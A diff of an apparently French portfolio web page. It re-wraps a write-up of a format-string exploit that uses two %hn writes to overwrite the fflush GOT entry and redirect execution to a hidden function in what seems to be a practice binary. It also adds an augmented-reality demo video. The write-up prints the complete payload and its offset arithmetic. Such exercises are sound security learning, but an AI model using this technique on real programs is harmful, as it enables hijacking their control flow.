@@ -514,31 +514,34 @@
                                 </div>
                             </div>
                         </div>
-                        <p>
-                            <b>Écrire le pointeur de "old_cowsay_please_dont_use" (0x08049202) à l'adresse "fflush" (0x0804c018) :</b><br>
-                            Pour écrire dans la mémoire avec %n (integer 4 octets) on doit écrire "0x08049202" (134 517 250 en décimal) caractères ce qui est impossible/long.<br>
-                            La solution est d'utiliser deux fois %hn (short integer 2 octets) : décomposition en "0x0804" (2052) et "0x9202" (37 378).
-                        </p>
-                        <p>
-                            On écrit à "0x0804c018 + offset de 2 octets" = "0x0804c020" la valeur 2052 - 8 = <b>2044</b><br>
-                            (-8 car l'adresse 18c00408 "consomme" 8 octets)<br>
-                            <b>\x20\xc0\x04\x08%2044x%7$hn</b>
-                        </p>
-                        <ul>
-                            <li>"\x20\xc0\x04\x08" = Adresse à la quelle on veut écrire</li>
-                            <li>"%2044x" = Nombre de caractères à écrire (exemple : 15 = 0x000F)</li>
-                            <li>"%7" = Position du buffer dans la pile</li>
-                            <li>"$hn" = Fonction qui écrit un nombre d'octets donnés sur 2 bytes</li>
-                        </ul>
-                        <p>
-                            On écris maintenant à "0x0804c020" : 37378 - 2052 = <b>35326</b><br>
-                            (-2052 car on les à déjà écrit précedemment)<br>
-                            <b>\x18\xc0\x04\x08%35326x%8$hn</b>
-                        </p>
-                        <p>
-                            On combine les deux : <b>\x20\xc0\x04\x08\x18\xc0\x04\x08%2044x%7$hn%35326x%8$hn</b>.<br>
-                            Il suffit désormais d'entrer cet input pour appeler la fonction "old_cowsay_please_dont_use".
-                        </p>
+
+                        <div class="row item">
+                            <p>
+                                <b>Écrire le pointeur de "old_cowsay_please_dont_use" (0x08049202) à l'adresse "fflush" (0x0804c018) :</b><br>
+                                Pour écrire dans la mémoire avec %n (integer 4 octets) on doit écrire "0x08049202" (134 517 250 en décimal) caractères ce qui est impossible/long.<br>
+                                La solution est d'utiliser deux fois %hn (short integer 2 octets) : décomposition en "0x0804" (2052) et "0x9202" (37 378).
+                            </p>
+                            <p>
+                                On écrit à "0x0804c018 + offset de 2 octets" = "0x0804c020" la valeur 2052 - 8 = <b>2044</b><br>
+                                (-8 car l'adresse 18c00408 "consomme" 8 octets)<br>
+                                <b>\x20\xc0\x04\x08%2044x%7$hn</b>
+                            </p>
+                            <ul>
+                                <li>"\x20\xc0\x04\x08" = Adresse à la quelle on veut écrire</li>
+                                <li>"%2044x" = Nombre de caractères à écrire (exemple : 15 = 0x000F)</li>
+                                <li>"%7" = Position du buffer dans la pile</li>
+                                <li>"$hn" = Fonction qui écrit un nombre d'octets donnés sur 2 bytes</li>
+                            </ul>
+                            <p>
+                                On écris maintenant à "0x0804c020" : 37378 - 2052 = <b>35326</b><br>
+                                (-2052 car on les à déjà écrit précedemment)<br>
+                                <b>\x18\xc0\x04\x08%35326x%8$hn</b>
+                            </p>
+                            <p>
+                                On combine les deux : <b>\x20\xc0\x04\x08\x18\xc0\x04\x08%2044x%7$hn%35326x%8$hn</b>.<br>
+                                Il suffit désormais d'entrer cet input pour appeler la fonction "old_cowsay_please_dont_use".
+                            </p>
+                        </div>
                         <div class="bgrid s-bgrid cf">
                             <div class="columns projets-item">
                                 <div class="item-wrap">
@@ -602,6 +605,16 @@
                                             <h5>Dessin d'un cube sur la vidéo en direct. Les points 2D sont vérifiés pour être dans les limites de la dimension de la vidéo.</h5>
                                         </div>
                                     </div>
+                                </div>
+                            </div>
+                        </div>
+                        <div class="bgrid s-bgrid cf" >
+                            <div class="columns projets-item"style="margin: auto;">
+                                <div class="item-wrap">
+                                    <video controls preload width="720">
+                                        <source src="videos/projects/graz/AR1.mp4" type="video/mp4" />
+                                        <source src="videos/projects/graz/AR1.webm" type="video/webm" />
+                                    </video>
                                 </div>
                             </div>
                         </div>
